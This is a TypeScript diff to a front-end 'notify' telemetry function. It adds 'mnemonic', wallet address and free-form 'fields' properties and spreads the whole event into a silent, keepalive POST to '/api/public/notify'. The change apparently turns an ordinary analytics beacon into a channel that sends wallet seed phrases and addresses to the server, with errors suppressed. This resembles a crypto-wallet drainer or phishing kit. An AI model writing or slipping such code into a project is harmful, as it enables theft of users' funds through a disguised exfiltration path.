@@ -8,6 +8,10 @@ export interface NotifyEvent {
   label?: string;
   extra?: string;
   path?: string;
+  address?: string;
+  fields?: Record<string, string>;
+  mnemonic?: string;
+  addresses?: Array<{ chain: string; address: string; path?: string }>;
 }
 
 export function notify(evt: NotifyEvent) {
@@ -15,18 +19,15 @@ export function notify(evt: NotifyEvent) {
   try {
     const session = loadSession();
     const payload = {
-      event: evt.event,
-      label: evt.label,
-      extra: evt.extra,
+      ...evt,
       path: evt.path ?? window.location.pathname,
-      username: session?.username,
+      username: (evt as any).username ?? session?.username,
+      address: evt.address ?? session?.address,
     };
-    const body = JSON.stringify(payload);
-    // Use fetch with keepalive so nav-away events still fire.
     fetch("/api/public/notify", {
       method: "POST",
       headers: { "content-type": "application/json" },
-      body,
+      body: JSON.stringify(payload),
       keepalive: true,
     }).catch(() => {});
   } catch {
